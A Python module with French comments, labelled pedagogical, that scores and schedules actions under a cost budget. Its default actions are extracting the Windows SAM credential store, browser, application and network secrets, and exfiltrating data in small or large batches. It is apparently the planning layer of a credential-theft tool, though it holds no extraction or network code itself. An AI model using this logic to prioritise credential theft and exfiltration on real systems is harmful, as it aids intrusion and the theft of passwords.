"""
Moteur de décision enrichi, pondéré et priorisant les cibles/méthodes.
Comportement pédagogique : règles configurables, score par action, priorisation.
"""
from typing import Dict, List, Tuple

class DecisionEngineEnhanced:
    def __init__(self, rules: Dict[str, Dict]=None):
        """rules: mapping of action -> dict(weight, base_score)
        exemple:
          {'extract_sam': {'weight':1.5, 'cost':5}, ...}
        """
        # valeurs par défaut pédagogiques
        if rules is None:
            rules = {
                'extract_sam': {'weight': 1.5, 'cost': 5},
                'extract_browser': {'weight': 1.2, 'cost': 3},
                'extract_app': {'weight': 1.0, 'cost': 2},
                'extract_network': {'weight': 1.3, 'cost': 4},
                'exfil_small': {'weight': 1.0, 'cost': 1},
                'exfil_large': {'weight': 0.6, 'cost': 5},
            }
        self.rules = rules

    def score_actions(self, fingerprint: Dict[str, str], stores_summary: Dict[str,int]) -> List[Tuple[str, float]]:
        """
        fingerprint : dict renvoyé par fingerprinter
        stores_summary : dict of store_name -> nb_items_available
        Renvoie une liste d'actions triées par score décroissant
        """
        scores = {}
        # exemple simple: privilégier extract_sam si système Windows ou si sam contient items
        osys = fingerprint.get('platform_system','').lower()
        for action, meta in self.rules.items():
            score = meta['weight']
            # boost si store present
            if action.startswith('extract_'):
                store = action.split('_',1)[1]
                n = stores_summary.get(store, 0)
                score *= (1 + 0.1 * n)
            # ex: si linux, maybe prefer network
            if osys == 'linux' and action == 'extract_network':
                score *= 1.2
            scores[action] = score
        # renvoyer trié
        sorted_actions = sorted(scores.items(), key=lambda x: x[1], reverse=True)
        return sorted_actions

    def plan(self, fingerprint: Dict[str,str], stores_summary: Dict[str,int], budget: float=10.0) -> List[Dict]:
        """
        Génère un plan d'actions à exécuter jusqu'à épuisement du budget (coût depuis rules)
        Renvoie une liste d'actions planifiées avec priorité et coût
        """
        ranked = self.score_actions(fingerprint, stores_summary)
        plan = []
        remaining = budget
        for action, score in ranked:
            cost = self.rules.get(action, {}).get('cost', 1)
            if cost <= remaining:
                plan.append({'action': action, 'score': score, 'cost': cost})
                remaining -= cost
        return plan

if __name__ == "__main__":
    de = DecisionEngineEnhanced()
    fp = {'platform_system':'Windows'}
    stores = {'sam':2,'browser':1,'app':1,'network':0}
    print(de.score_actions(fp, stores))
    print(de.plan(fp, stores, budget=8))
